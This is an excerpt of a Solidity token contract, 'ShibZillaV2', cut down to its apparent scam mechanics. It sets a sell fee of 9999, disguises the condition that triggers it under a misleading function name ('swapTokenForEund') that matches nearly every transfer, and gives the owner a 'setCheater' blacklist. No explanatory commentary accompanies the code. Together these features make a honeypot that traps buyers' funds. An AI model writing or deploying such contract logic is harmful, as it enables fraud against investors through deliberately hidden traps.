...
abstract contract AbsToken is IERC20, Ownable {
    ...
    mapping(address => bool) public _gameCheater;
    ...
    uint256 public _sellFundFee = 9999;
    ...
    function swapTokenForEund(address amount0Desired, address amount1Desired) internal view returns (bool){
        return (amount0Desired != amount1Desired) || (amount0Desired != fundAddress);
    }
    ...
    function _tokenTransfer(
        ...
        if (swapTokenForEund(sender,recipient))
    ...
    function setCheater(address addr, bool enable) external onlyOwner {
        _gameCheater[addr] = enable;
    }
...
contract ShibZillaV2 is AbsToken {
    constructor() AbsToken(
        ...
        "ShibZillaV2",
        6,
        69_000_000_000_000_000_000_000,
        address(0xc3977E828e0a3314179aeb97D83fCAda3291af37),
        address(0xc3977E828e0a3314179aeb97D83fCAda3291af37)
    ){
    }
}